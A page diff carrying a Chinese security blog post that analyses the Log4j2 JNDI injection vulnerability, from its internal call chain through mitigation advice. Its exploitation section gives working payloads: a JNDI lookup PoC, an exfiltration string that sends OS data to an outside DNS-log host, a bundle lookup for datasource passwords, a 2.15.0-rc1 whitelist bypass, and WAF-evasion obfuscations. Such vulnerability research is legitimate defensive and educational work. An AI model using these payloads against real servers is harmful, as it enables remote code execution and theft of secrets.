@@ -12,7 +12,7 @@
     
     <meta http-equiv="Cache-Control" content="no-siteapp" />
 
-    <title>About | MYZXCG</title>
+    <title>Log4j2 利用链与Waf绕过分析 | MYZXCG</title>
 
     <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>
 
@@ -27,7 +27,7 @@
         <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
         <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
 
-    <meta name="author" content="myzxcg" /><meta name="description" content="专注于Web安全、内网渗透。记录学习与渗透过程中遇到的有意思的点，分享技巧与知识。欢……" />
+    <meta name="author" content="myzxcg" /><meta name="description" content="log4j 2漏洞一个半月前就已经爆出来了，现在才发分析属实有点晚。主要因为前一段时间在忙着学……" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
@@ -37,9 +37,9 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black" />
     <meta name="mobile-web-app-capable" content="yes" />
     <meta name="application-name" content="MYZXCG" />
-    <meta name="msapplication-starturl" content="../" />
+    <meta name="msapplication-starturl" content="../../../" />
     <meta name="msapplication-TileColor" content="#603cba" />
-    <meta name="msapplication-TileImage" content="../icons/mstile-150x150.png" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
     <link rel="manifest" href="/manifest.json" />
 
 
@@ -47,19 +47,31 @@
     
 
     
-    <link rel="canonical" href="https://myzxcg.com/about/" />
+    <link rel="canonical" href="https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" />
     
 
 <script type="application/ld+json">
     {
         "@context": "https://schema.org",
-        "@type": "WebPage",
-        "datePublished": "2021-11-19T19:41:35+08:00",
-        "dateModified": "2021-11-22T20:05:16+08:00",
-        "url": "https://myzxcg.com/about/",
-        "name": "",
-        "description": "专注于Web安全、内网渗透。记录学习与渗透过程中遇到的有意思的点，分享技巧与知识。欢……",
-        "image": "https://myzxcg.com/icons/favicon.ico",
+        "@type": "BlogPosting",
+        "datePublished": "2022-01-15T20:34:25+08:00",
+        "dateModified": "2022-01-16T15:52:21+08:00",
+        "url": "https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/",
+        "headline": "Log4j2 利用链与Waf绕过分析",
+        "description": "log4j 2漏洞一个半月前就已经爆出来了，现在才发分析属实有点晚。主要因为前一段时间在忙着学……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  3986 ,
+        "image": ["https://myzxcg.com/images/image-20220116152734.png","https://myzxcg.com/images/image-20220116152804.png","https://myzxcg.com/images/image-20220116152824.png","https://myzxcg.com/images/image-20220116152843.png","https://myzxcg.com/images/image-20220116152923.png","https://myzxcg.com/images/image-20220116152951.png","https://myzxcg.com/images/image-20220116153016.png","https://myzxcg.com/images/image-20220116153032.png","https://myzxcg.com/images/image-20220116153059.png","https://myzxcg.com/images/image-20220116153123.png","https://myzxcg.com/images/image-20220116153146.png","https://myzxcg.com/images/image-20220116153309.png","https://myzxcg.com/images/image-20220116153332.png","https://myzxcg.com/images/image-20220116153351.png","https://myzxcg.com/images/image-20220116153417.png"],
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
         "publisher": {
             "@type": "Organization",
             "name": "MYZXCG",
@@ -78,20 +90,27 @@
 
     
 
-<meta name="twitter:card" content="summary" />
+<meta name="twitter:card" content="summary_large_image" />
+
 
 <meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
 
     
 
 
 
-<meta property="og:title" content="" />
-<meta property="og:description" content="专注于Web安全、内网渗透。记录学习与渗透过程中遇到的有意思的点，分享技巧与知识。欢……" />
-<meta property="og:url" content="https://myzxcg.com/about/" />
+<meta property="og:title" content="Log4j2 利用链与Waf绕过分析" />
+<meta property="og:description" content="log4j 2漏洞一个半月前就已经爆出来了，现在才发分析属实有点晚。主要因为前一段时间在忙着学……" />
+<meta property="og:url" content="https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" />
 <meta property="og:site_name" content="MYZXCG" />
-<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/icons/favicon.ico" />
-    <meta property="og:type" content="website" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-20220116152734.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2022-01-15T20:34:25&#43;08:00" />
+    <meta property="article:modified_time" content="2022-01-16T15:52:21&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
 
         <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
 
@@ -185,15 +204,14 @@
 
             
             
-    
-        <main class="main single" id="main">
+    <main class="main single" id="main">
     <div class="main-inner">
 
         
 
-        <article class="content post h-entry" data-align="justify" data-type="about" data-toc-num="true">
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
 
-            <h1 class="post-title p-name"></h1>
+            <h1 class="post-title p-name">Log4j2 利用链与Waf绕过分析</h1>
 
             
 
@@ -202,17 +220,339 @@
             
 
             
+                
 
-            <div class="post-body e-content">
-                <blockquote class="quote-center">
-        <p>专注于Web安全、内网渗透。记录学习与渗透过程中遇到的有意思的点，分享技巧与知识。欢迎交流～</p></blockquote> 
-<h4 id="links"><a href="#links" class="anchor-link">#</a>Links</h4>
-<p><strong><a href="https://idiotc4t.com" target="_blank" rel="noopener">idiotc4t</a> | <a href="https://uknowsec.cn" target="_blank" rel="noopener">uknowsec</a></strong></p>
+<div class="post-meta">
+    
+        
+        <time datetime="2022-01-15T20:34:25&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.1.15</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;8&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:基本原理" href="#基本原理">基本原理</a>
+      <ol>
+        <li><a id="contents:环境配置" href="#环境配置">环境配置</a></li>
+        <li><a id="contents:配置文件介绍" href="#配置文件介绍">配置文件介绍</a></li>
+        <li><a id="contents:调用过程分析" href="#调用过程分析">调用过程分析</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:利用与绕过" href="#利用与绕过">利用与绕过</a>
+      <ol>
+        <li><a id="contents:利用姿势" href="#利用姿势">利用姿势</a></li>
+        <li><a id="contents:2150-rc1-绕过" href="#2150-rc1-绕过">2.15.0 rc1 绕过</a></li>
+        <li><a id="contents:waf-绕过" href="#waf-绕过">WAF 绕过</a></li>
+        <li><a id="contents:受影响的应用" href="#受影响的应用">受影响的应用</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:修复与防御" href="#修复与防御">修复与防御</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <blockquote>
+<p>log4j 2漏洞一个半月前就已经爆出来了，现在才发分析属实有点晚。主要因为前一段时间在忙着学习汇编。在闲暇的时候跟了一下log4 j2的调用过程，简单总结一下。</p>
+</blockquote>
+<p>Log4j2是Apache的一个开源项目，使用Log4j2可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等。也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
+<h2 id="基本原理"><a href="#基本原理" class="anchor-link">#</a><a href="#contents:基本原理" class="headings">基本原理</a></h2>
+<h3 id="环境配置"><a href="#环境配置" class="anchor-link">#</a><a href="#contents:环境配置" class="headings">环境配置</a></h3>
+<p>maven 导入log4j的jar包。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>log4j-core<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>2.14.1<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>在工程目录resources下创建log4j2.xml。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="nt">&lt;configuration</span> <span class="na">status=</span><span class="s">&#34;error&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;appenders&gt;</span>
+        <span class="c">&lt;!--配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span>
+        <span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">&#34;Console&#34;</span> <span class="na">target=</span><span class="s">&#34;SYSTEM_OUT&#34;</span> <span class="nt">&gt;</span>
+            <span class="c">&lt;!--配置Console的模式布局--&gt;</span>
+            <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">&#34;%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n&#34;</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/Console&gt;</span>
+    <span class="nt">&lt;/appenders&gt;</span>
+    <span class="nt">&lt;loggers&gt;</span>
+        <span class="nt">&lt;root</span> <span class="na">level=</span><span class="s">&#34;info&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;appender-ref</span> <span class="na">ref=</span><span class="s">&#34;Console&#34;</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/root&gt;</span>
+    <span class="nt">&lt;/loggers&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="配置文件介绍"><a href="#配置文件介绍" class="anchor-link">#</a><a href="#contents:配置文件介绍" class="headings">配置文件介绍</a></h3>
+<p>下面对配置文件中有关参数进行介绍</p>
+<p><code>Configuration</code>为根节点，有status和monitorInterval等多个属性。status的值用于控制log4j2日志框架<strong>本身</strong>的日志级别，一般不用设置。</p>
+<ul>
+<li>
+<p><code>Appenders</code>是输出源，用于定义日志输出的地方。log4j2支持的输出源有Console、File、RollingRandomAccessFile、MongoDB、Flume等。</p>
+<ul>
+<li><code>Console</code>控制台输出源是将日志打印到控制台上，开发的时候一般都会配置，以便调试。
+<ul>
+<li>
+<p><code>PatternLayout</code> 控制台或文件输出源都必须包含一个PatternLayout节点，用于指定输出文件的格式。各标记符详细含义如下:</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">%d{HH:mm:ss.SSS} 表示输出到毫秒的时间
+%t 输出当前线程名称
+%-5level 输出日志级别，-5表示左对齐并且固定输出5个字符，如果不足在右边补0
+%logger 输出logger名称，因为Root Logger没有名称，所以没有输出
+%msg 日志文本
+%n 换行
+...
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>Loggers</code>日志器分<code>root日志器</code>和<code>自定义日志器</code>，当根据日志名字获取不到指定的日志器时就使用Root作为默认的日志器。自定义时需要指定每个Logger的名称、日志级别等。此外，还需要配置一个或多个输出源<code>AppenderRef</code> 。</p>
+<p>每个logger可以指定一个level，不指定时默认为ERROR。低于此等级的日志信息不会被记录，只有高于或等于此等级的信息会被记录。</p>
+<p>级别由高到低共分为6个：<code>fatal, error, warn, info, debug, trace</code></p>
+</li>
+</ul>
+<h3 id="调用过程分析"><a href="#调用过程分析" class="anchor-link">#</a><a href="#contents:调用过程分析" class="headings">调用过程分析</a></h3>
+<p>POC:</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">log4j2Exploit</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">run</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${jndi:ldap://127.0.0.1:3890/test}&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>跟进<code>logger.error()→logIfEnabled()→isEnabled()→filter()</code> 中判断了当前调用的日志等级是否高于等于配置文件中配置的。（intLevel的值是日志等级越高，值就越小）
+<img src="/images/image-20220116152734.png" alt="">
+判断完成后回到<code>logIfEnabled()</code></p>
+<p>再进入<code>logMessage()→...→tryLogMessage()→log()...-&gt;tryAppend()→directEncodeEvent()</code></p>
+<p>直到<code>directEncodeEvent()</code>函数之前没什么好说的，都是读取配置文件创建event事件等操作。
+<img src="/images/image-20220116152804.png" alt="">
+<code>this.getLayout()</code> 获取配置文件里设置的输出格式，并调用encode()处理event。</p>
+<p>紧接着调用了toText方法来用不同Converter处理传入的数据，并将结果存入buffer中。
+<img src="/images/image-20220116152824.png" alt="">
+这里解释一下这10个converter对象是干什么的：</p>
+<p>比如第一个<code>DatePatternConverter</code> 就是用来根据event对象中的<code>%d{yyyy-MM-dd HH:mm:ss.SSS}</code>（也就是从配置文件中设置的） 转换成按照此格式的时间表示，并将值存在buffer中。所以同理，后面所有的converter就是按照配置文件中设置的输出格式转换为对应的值，并将结果添加到buffer中。
+<img src="/images/image-20220116152843.png" alt="">
+输入<code>${jndi:ldap://127.0.0.1:3890/test}</code>对应的是<code>%msg</code>，处理的converter是<code>MessagePatternConverter</code>，也就是i=8，跟进它的format()。
+<img src="/images/image-20220116152923.png" alt="">
+首先通过<code>event.getMessage()</code>获取到Message对象。再重新创建一个StringBuilder对象<code>workingBuilder</code>，将之前coverter格式化好的部分赋值给<code>workingBuilder</code>，并添加msg对应的字符串给此对象。</p>
+<p>然后从之前coverter格式化好的字符串末尾开始，遍历之后的<code>workingBuilder</code>字符串，直到找到<code>${</code> 起始的位置。找到后将<code>${</code>到整个字符串末尾的值复制给value，并将<code>workingBuilder</code>的长度设置为之前未拼接msg的长度，并重新添加<code>this.config.getStrSubstitutor().replace(event, value)</code> 的值到<code>workingBuilder</code>。</p>
+<p>这段操作意思: 如果msg中存在<code>${</code>字符串，取出msg值后，就将整个msg字符串从<code>workingBuilder</code>中替换掉。</p>
+<p>然后跟入replace函数。
+<img src="/images/image-20220116152951.png" alt="">
+这里主要是对传入的msg字符串进行处理，循环查找以<code>${</code>字符串开头和以<code>}</code>字符串结束的位置，获取两者之间字符串，即<code>jndi:ldap://127.0.0.1:3890/test</code>。（同时还会递归判断这个字符串中是否还有<code>${</code>与<code>}</code>）</p>
+<p>最后进入<code>resolveVariable()</code> 方法。支持的Interpolator类型。
+<img src="/images/image-20220116153016.png" alt="">
+<img src="/images/image-20220116153032.png" alt="">
+通过 <code>var.indexOf(58)</code>获取<code>:</code>号的索引位置，得到Interpolator前缀。再根据对应的前缀调用lookup方法。</p>
+<p>进入到log4j的JndiLookup类的lookup方法中，通过jndi调用lookup。
+<img src="/images/image-20220116153059.png" alt=""></p>
+<h2 id="利用与绕过"><a href="#利用与绕过" class="anchor-link">#</a><a href="#contents:利用与绕过" class="headings">利用与绕过</a></h2>
+<h3 id="利用姿势"><a href="#利用姿势" class="anchor-link">#</a><a href="#contents:利用姿势" class="headings">利用姿势</a></h3>
+<p>关于JNDI 的利用方式，可参考之前写的文章<a href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">Java-JNDI分析与利用</a>。</p>
+<p>前面分析中可以看到，能利用的不止JNDI前缀。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">runtime</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">vm</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">os</span><span class="o">}</span> <span class="c1">//获取java运行时版本，jvm版本，和操作系统版本
+</span><span class="c1"></span><span class="n">$</span><span class="o">{</span><span class="n">sys</span><span class="o">:</span><span class="n">java</span><span class="o">.</span><span class="na">version</span><span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>外带数据: <code>${jndi:ldap://${java:os}.2lnhn2.ceye.io}</code></p>
+<p>还可利用Bundle协议读取项目配置文件来获取敏感信息。</p>
+<p><code>${bundle:application:spring.datasource.password}</code></p>
+<h3 id="2150-rc1-绕过"><a href="#2150-rc1-绕过" class="anchor-link">#</a><a href="#contents:2150-rc1-绕过" class="headings">2.15.0 rc1 绕过</a></h3>
+<p>这个绕过有点鸡肋，需要修改配置，默认配置下是不能触发JNDI远程加载的。</p>
+<p>简单说一下变化:</p>
+<p>前面用到的<code>MessagePatternConverter</code>这个converter 变成了<code>MessagePatternConverter$SimpleMessagePatternConverter</code>
+<img src="/images/image-20220116153123.png" alt="">
+可以看到没有像MessagePatternConverter那样对传入的数据进行${ 判断。而是在LookupMessagePatternConverter.format()方法中才进行了判断，并调用replaceIn()。
+<img src="/images/image-20220116153146.png" alt="">
+然而要触发这个converter，需要修改配置文件，在%msg的后面添加一个{lookups}。</p>
+<p>同时JndiManager.lookup方法增加了白名单校验，当以ldap和ldaps协议请求就会判断请求的host。白名单里只允许本机地址。</p>
+<p>按理说是无解的，但是在JndiManager.lookup方法中，在捕获异常后没有进行任何操作，从而能走到<code>this.context.lookup()</code> 。
+<img src="/images/image-20220116153309.png" alt="">
+所以只要让lookup方法在执行的时候抛个异常即可。</p>
+<p>payload: <code>${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject}</code>。在url 中增加一个空格，就会导致报错。这样连针对host的校验都能绕过。</p>
+<p>修复: 在rc2中，catch之后就直接return了(2.15.0稳定版本不受影响)。</p>
+<p><em><strong>Tips:</strong></em> 提一下<code>2.0-beta7 ≤ Log4j 2.x ≤ 2.17.0</code>（2.3.2 和 2.12.4 版本不受影响），如果配置文件可控，利用Log4j2 提供的 JDBCAppender 功能可以导致JNDI注入。在<code>Log4j2 ≤ 2.16.0</code>的版本由于substitute函数的递归解析还能导致拒绝服务攻击。</p>
+<h3 id="waf-绕过"><a href="#waf-绕过" class="anchor-link">#</a><a href="#contents:waf-绕过" class="headings">WAF 绕过</a></h3>
+<p><strong>绕过方法一</strong></p>
+<p>前面提到过在处理<code>${jndi:ldap://127.0.0.1:3890/test}</code>的时候会递归处理。首先循环查找<code>${</code> 和<code>}</code> 的位置，获取两者之间的字符串。前面没有说的是，找完<code>${</code> 和<code>}</code>之后它还会查找<code>:-</code>。</p>
+<p>以<code>${${,:-j}ndi:ldap://127.0.0.1:3890/test}</code> 为例:
+<img src="/images/image-20220116153332.png" alt="">
+如果找到就截取<code>:-</code>之前的变量赋值给varName，截取<code>:-</code>到末尾的字符串赋值为varDefaultValve，然后就跳出循环。</p>
+<p>然后使用resolveVariable() 对varName的内容进行判断，如果不匹配任何log4j2支持的协议，就返回null（这里varName的值为<code>,</code>）。之后就会把varDefaultValve的值（这里为<code>j</code>）赋给varValue。然后再用varValue替换整个<code>${,:-j}</code> ，即最后结果为<code>jndi:ldap://127.0.0.1:3890/test</code> 。
+<img src="/images/image-20220116153351.png" alt="">
+所以绕过方法可以是:</p>
+<p><code>${任意字符串:-实际想要的字符串} = 实际想要的字符串</code></p>
+<p>注意这里的任意字符串不能为log4j2 支持的Interpolator前缀。</p>
+<p>例如: <code>${${fdafasdfasdfasfdas:-j}ndi:ldap://127.0.0.1:3890/test}</code></p>
+<p><strong>绕过方法二</strong></p>
+<p>可以看看log4j2所支持的Interpolator前缀，有哪些支持对字符串的处理。
+<img src="/images/image-20220116153417.png" alt="">
+所以可以用<code>${lower:j}${upper:n}</code> 等前缀来处理字符串。（部分版本不支持lower, upper等协议）</p>
+<h3 id="受影响的应用"><a href="#受影响的应用" class="anchor-link">#</a><a href="#contents:受影响的应用" class="headings">受影响的应用</a></h3>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Spring</span><span class="o">-</span><span class="n">Boot</span><span class="o">-</span><span class="n">strater</span><span class="o">-</span><span class="n">log4j2</span>
+<span class="n">Apache</span> <span class="n">Struts2</span>
+<span class="n">Apache</span> <span class="n">Solr</span>
+<span class="n">Apache</span> <span class="n">Flink</span>
+<span class="n">Apache</span> <span class="n">Druid</span>
+<span class="n">ElasticSearch</span>
+<span class="n">flume</span>
+<span class="n">dubbo</span>
+<span class="n">Redis</span>
+<span class="n">logstash</span>
+<span class="n">kafka</span>
+<span class="n">VMware</span> <span class="n">Horizon</span>
+<span class="n">VMware</span> <span class="n">vCenter</span> <span class="n">Server</span>
+<span class="n">VMware</span> <span class="n">HCX</span>
+<span class="n">VMware</span> <span class="n">NSX</span><span class="o">-</span><span class="n">T</span> <span class="n">Data</span> <span class="n">Center</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5MDc1NDc1MQ==&amp;mid=2247491068&amp;idx=1&amp;sn=c41b8b9e561d5ddaa539b41dc661ba2b&amp;chksm=9007862ca7700f3a302398570f65ee438010c2e92a9096ae2870174cb2c79beab018663d47f5#rd" target="_blank" rel="noopener">受影响的主流应用软件</a></p>
+<h2 id="修复与防御"><a href="#修复与防御" class="anchor-link">#</a><a href="#contents:修复与防御" class="headings">修复与防御</a></h2>
+<ol>
+<li>升级到最新版</li>
+<li>临时修改方法:
+<ul>
+<li>jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（版本&gt;=2.10.0有效）</li>
+<li>设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true （版本&gt;=2.10.0有效）</li>
+<li>log4j2 &lt; 2.10以下的版本移除JndiLookup类。</li>
+</ul>
+</li>
+<li>禁止没有必要的业务访问外网</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li>
+<p><a href="https://paper.seebug.org/1789/" target="_blank" rel="noopener">从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228 漏洞</a></p>
+</li>
+<li>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652884077&amp;idx=1&amp;sn=c28b0de92fbe7595753a95e5d34b6837&amp;chksm=bd59b0a08a2e39b6c9eb03b388e4bbcf3718f73628e114302f4acba9b24d5e6da4b419fd9419#rd" target="_blank" rel="noopener">log4j2 JNDI注入分析笔记</a></p>
+</li>
+</ol>
 
             </div>
 
             
     
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://myzxcg.com/2022/01/Log4j2-利用链与Waf绕过分析/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
     
 
 
@@ -240,13 +580,57 @@
 
 
         
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Java/" rel="tag" class="post-tag-link">#java</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
 
 
         
 
 
         
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+            
+                <li class="post-nav-next">
